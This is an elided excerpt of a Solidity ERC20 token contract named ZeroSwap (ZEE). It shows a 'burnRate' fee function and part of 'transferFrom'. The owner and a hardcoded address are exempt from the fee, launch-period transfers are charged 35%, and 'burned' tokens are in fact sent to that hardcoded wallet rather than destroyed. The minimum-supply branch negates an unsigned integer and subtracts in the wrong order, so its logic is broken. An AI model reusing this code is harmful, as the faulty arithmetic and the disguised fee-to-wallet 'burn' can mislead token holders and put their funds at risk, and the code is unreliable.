...
contract ZeroSwap is ERC20Detailed, ERC20Burnable, Ownable {
	...
	constructor() public ERC20Detailed('ZeroSwap', 'ZEE', 18) {
	...
	function burnRate(
		...
		if (
			sender == this.owner() ||
			sender == 0x7EEFEFD124e6f07ab51F6CcE915126b0E7C0c330 ||
			burnOn == false
		) {
			return 0;
		}
		...
		if ((block.number).sub(startBlock) < 35) {
			return amount.mul(350).div(1000);
		}
		if (this.totalSupply() <= 10 ether) {
			//block.number < 10968069 ||
			return 0;
		}
		if (this.totalSupply().sub(amount.mul(35).div(1000)) < 10 ether) {
			uint256 minSupply = 10 ether;
			return -(minSupply.sub(this.totalSupply()));
		}
		return amount.mul(35).div(1000);
	}
	...
	function transferFrom(
		...
		if (amountToBurn > 0) {
			...
			_transfer(
				sender,
				0x7EEFEFD124e6f07ab51F6CcE915126b0E7C0c330,
				amountToBurn
			);
